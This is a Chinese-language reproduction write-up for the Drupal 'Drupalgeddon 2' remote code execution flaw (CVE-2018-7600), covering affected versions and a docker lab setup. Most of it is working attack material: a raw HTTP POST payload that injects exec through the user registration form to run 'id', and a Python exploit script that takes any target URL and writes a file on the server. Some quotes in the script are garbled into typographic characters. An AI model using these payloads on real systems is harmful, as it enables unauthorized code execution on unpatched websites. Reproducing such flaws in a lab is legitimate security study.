# （CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2893](https://www.zhihuifly.com/t/topic/2893)

# （CVE-2018-7600）Drupal Drupalgeddon 2 远程代码执行漏洞

## 一、漏洞简介

Drupal是Drupal社区所维护的一套使用PHP语言开发的免费，开源的内容管理系统。版本受到影响：Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。

## 二、漏洞影响

Drupal7.58之前的版本，8.3.9之前的8.x版本，8.4.6之前的8.4.x版本，8.5.1之前的8.5.x版本。

## 三、复现过程

### 漏洞环境

执行如下命令启动drupal 8.5.0的环境：

```
docker-compose up -d 
```

环境启动后，访问`http://your-ip:8080/`将会看到drupal的安装页面，一路默认配置下一步安装。因为没有mysql环境，所以安装的时候可以选择sqlite数据库。

### 漏洞复现

参考[ianxtianxt/CVE-2018-7600](https://github.com/ianxtianxt/CVE-2018-7600)，我们向安装完成的drupal发送如下数据包：

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103 `form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id` 
```

成功执行代码，这个代码最终执行了id命令：

![image](img/373a1ad3552bf62fe4f1ac5c8fac9a71.png)

### **exploit.py**

```
#!/usr/bin/env python3
import sys
import requests

print (’################################################################’)

print (’# Proof-Of-Concept for CVE-2018-7600’)

print (’# by Vitalii Rudnykh’)

print (’# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders’)

print (’# [https://github.com/a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)’)

print (’################################################################’)

print (‘Provided only for educational or information purposes\n’)

target = input('Enter target url (example: [https://domain.ltd/](https://domain.ltd/)): ')

# Add proxy support (eg. BURP to analyze HTTP(s) traffic)

# set verify = False if your proxy certificate is self signed

# remember to set proxies both for http and https

# example:

# proxies = {‘http’: ‘[http://127.0.0.1:8080](http://127.0.0.1:8080)’, ‘https’: ‘[http://127.0.0.1:8080](http://127.0.0.1:8080)’}

# verify = False

proxies = {}

verify = True

url = target + ‘user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax’

payload = {‘form_id’: ‘user_register_form’, ‘_drupal_ajax’: ‘1’, ‘mail[#post_render][]’: ‘exec’, ‘mail[#type]’: ‘markup’, ‘mail[#markup]’: ‘echo “;-)” | tee hello.txt’} `r = requests.post(url, proxies=proxies, data=payload, verify=verify)

check = requests.get(target + ‘hello.txt’, proxies=proxies, verify=verify)

if check.status_code != 200:

sys.exit(“Not exploitable”)

print (’\nCheck: '+target+‘hello.txt’)` 
```

## 参考链接

> https://vulhub.org/#/environments/drupal/CVE-2018-7600/